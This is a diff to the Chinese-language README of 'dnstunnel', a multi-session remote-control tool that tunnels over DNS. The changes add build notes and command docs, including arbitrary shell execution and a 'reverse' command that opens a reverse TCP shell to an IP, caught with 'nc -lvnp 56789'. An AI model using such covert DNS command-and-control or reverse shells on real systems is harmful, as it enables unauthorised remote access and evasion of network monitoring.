@@ -1,8 +1,14 @@
 # dnstunnel
-一款多会话的二进制DNS隧道远控
+一款多会话的二进制DNS隧道远控，一个服务端可以连接多个客户端（暂未做充分测试，欢迎提issue）。
+DNS通道传输能力非常有限，速率比较低，传输大量的字节需要很长时间。
 # 编译
+依赖zlib  
 ```
 ./build.sh
+```
+编译debug版本  
+```
+./build.sh debug
 ```
 # 域名配置
 使用者需要在域名服务做如下配置(以gandi.net为例):  
@@ -40,6 +46,7 @@ rm <file>
 cd <dir>
 pwd
 hostip
+reverse <ip> <port>
 Session[29727]>>
 ```
 ## session
@@ -70,7 +77,7 @@ download aaa bbb
 ```
 bash which python
 ```
-可执行任意shell命令，注意不要执行需要交互的命令  
+可执行任意shell命令，返回执行结果，注意不要执行需要交互的命令  
 ## move
 ```
 move <src> <dst>
@@ -99,7 +106,7 @@ list
 ## hostip  
 获取远端机器的出口ip和主机名
 ## reverse
-反弹shell
+反弹TCP shell，服务端使用nc -lvnp 56789接收
 ```
 reverse 112.55.4.22 56789
 ```
